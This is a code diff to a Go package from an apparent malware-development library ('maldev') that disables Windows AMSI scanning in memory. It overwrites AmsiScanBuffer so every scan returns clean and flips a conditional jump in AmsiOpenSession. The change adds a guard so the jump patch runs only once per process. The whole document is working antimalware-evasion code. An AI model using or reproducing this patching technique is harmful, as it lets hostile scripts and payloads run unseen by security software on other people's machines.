@@ -13,11 +13,20 @@ package amsi
 
 import (
 	"fmt"
+	"sync/atomic"
 	"unsafe"
 
 	"github.com/oioio-space/maldev/win/api"
 	wsyscall "github.com/oioio-space/maldev/win/syscall"
 )
+
+// openSessionPatched tracks whether AmsiOpenSession's first JZ has already
+// been flipped in this process. The scan in PatchOpenSession is destructive:
+// each successful call rewrites a different 0x74 byte, so without this guard
+// repeated invocations eventually exhaust the 0x74 sites in the prologue and
+// surface a "conditional jump (0x74) not found" error on what is in fact an
+// already-patched process.
+var openSessionPatched atomic.Bool
 
 // PatchScanBuffer patches AmsiScanBuffer to always return S_OK (AMSI_RESULT_CLEAN).
 // The patch overwrites the function entry with: xor eax, eax; ret (31 C0 C3).
@@ -42,6 +51,9 @@ func PatchScanBuffer(caller *wsyscall.Caller) error {
 // Returns nil if amsi.dll is not loaded.
 // If caller is non-nil, memory protection changes use the specified syscall method.
 func PatchOpenSession(caller *wsyscall.Caller) error {
+	if openSessionPatched.Load() {
+		return nil
+	}
 	proc := api.Amsi.NewProc("AmsiOpenSession")
 	if err := proc.Find(); err != nil {
 		return nil // AMSI not loaded
@@ -50,7 +62,11 @@ func PatchOpenSession(caller *wsyscall.Caller) error {
 	for i := uintptr(0); i < 1024; i++ {
 		b := *(*byte)(unsafe.Pointer(addr + i))
 		if b == 0x74 { // JZ
-			return api.PatchMemoryWithCaller(addr+i, []byte{0x75}, caller) // JNZ
+			if err := api.PatchMemoryWithCaller(addr+i, []byte{0x75}, caller); err != nil {
+				return err
+			}
+			openSessionPatched.Store(true)
+			return nil
 		}
 	}
 	return fmt.Errorf("AmsiOpenSession: conditional jump (0x74) not found in first 1024 bytes")
